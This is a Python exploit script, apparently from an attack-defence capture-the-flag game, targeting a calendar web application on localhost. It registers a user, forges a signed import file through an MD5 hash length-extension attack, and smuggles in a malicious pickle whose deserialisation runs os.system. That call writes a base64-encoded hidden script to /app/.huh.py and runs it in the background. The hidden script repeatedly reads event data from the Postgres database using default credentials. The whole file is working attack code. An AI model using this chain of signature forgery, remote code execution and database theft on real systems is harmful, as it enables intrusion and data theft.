import os
import pickle
import random
import string
import base64

import HashTools
import requests

URL = "http://localhost:8888"


class PAYLOAD:
    def __reduce__(self):
        f = rb"""
import asyncio
import socket
from calendary.models import Event
from sqlalchemy import select
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

POSTGRES = "postgresql+asyncpg://postgres:changeme@postgres:5432"

async def main():
    engine = create_async_engine(POSTGRES)
    db_sessionmaker = async_sessionmaker(engine)

    while True:
        async with db_sessionmaker() as session:
            stmt = select(Event.details).filter(Event.details.endswith("="))
            result = await session.execute(stmt)
            events = result.all()

            stmt = select(Event.name).filter(Event.name.endswith("="))
            result = await session.execute(stmt)
            events.extend(result.all())

            print(events)  # send straight to jury 

        asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
"""

        f = base64.b64encode(f).decode()
        return os.system, ("echo %s | base64 -d > /app/.huh.py && python /app/.huh.py &" % f,), {}


with requests.session() as s:
    gen = lambda: "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    username = gen()
    password = gen()

    resp = s.post(
        URL + "/register",
        data={"username": username, "password": password},
        allow_redirects=False,
    )
    if resp.status_code != 302:
        raise Exception(f"Invalid status code on /register: {resp.status_code}")

    event = {
        "name": "123",
        "start": 123,
        "end": 150,
        "details": "qwe",
        "private": "on",
    }

    resp = s.post(URL + "/create", data=event, allow_redirects=False)
    if resp.status_code != 302:
        raise Exception(f"Invalid status code on /create: {resp.status_code}")

    redirect = resp.headers.get("Location")
    if not redirect:
        raise Exception(f"No Location header in /create")

    try:
        id = int(redirect.split("/")[-2])
    except Exception as e:
        raise Exception(f"Failed to get created event id, got {redirect}")

    resp = s.get(URL + f"/export?id={id}")
    if resp.status_code != 200:
        raise Exception(f"Invalid status code on /export: {resp.status_code}")

    data = resp.text
    parts = data.split("\n")
    hash = parts[0]
    data = bytes.fromhex(parts[1])

    payload = pickle.dumps(PAYLOAD())
    def try_exploit(s, i):
        # NOTE: change "md5" to another exploitable hash if needed
        magic = HashTools.new("md5")
        new_data, new_sig = magic.extension(
            secret_length=i, original_data=data, append_data=payload, signature=hash
        )

        payl = new_sig + "\n" + new_data.hex()
        resp = s.post(URL + "/import", files={"file": ("payl", payl)})
        return resp.status_code

    # NOTE: uncomment in case of changed secret legnth
    # HASH_BLOCK_SIZE = 32
    # for i in range(0, HASH_BLOCK_SIZE):
    #     sc = try_exploit(s, i+1)
    #     if sc == 200:
    #         print("Imported malitious event")
    #         break

    sc = try_exploit(s, 32)
    if sc == 200:
        print("Imported malitious event")
    else:
        print("Failed to import malitious event")